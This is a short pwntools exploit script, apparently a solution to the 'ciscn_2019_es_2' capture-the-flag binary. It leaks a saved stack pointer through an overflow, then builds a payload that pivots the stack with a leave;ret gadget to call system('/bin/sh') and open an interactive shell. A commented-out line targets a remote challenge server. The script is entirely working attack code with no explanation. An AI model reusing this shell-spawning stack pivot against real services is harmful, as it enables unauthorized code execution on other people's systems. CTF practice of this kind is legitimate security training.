from pwn import*
#p=remote("node4.buuoj.cn",26868)
p=process('./ciscn_2019_es_2')
elf=ELF('./ciscn_2019_es_2')
context.log_level='debug'
sys_addr=elf.plt['system']
pop_ebp=0x904869b
leave_ret=0x80484b8

payload=b'a'*0x27+b'b'
p.send(payload)
p.recvuntil(b'b')
ebp=u32(p.recv(4))-0x10
print(hex(ebp))
new_ebp=ebp-0x28

payload=p32(0)+p32(sys_addr)+p32(0)+p32(new_ebp+0x10)+b'/bin/sh\x00'
payload=payload.ljust(0x28,b'a')
payload+=p32(new_ebp)+p32(leave_ret)
p.sendline(payload)
p.interactive()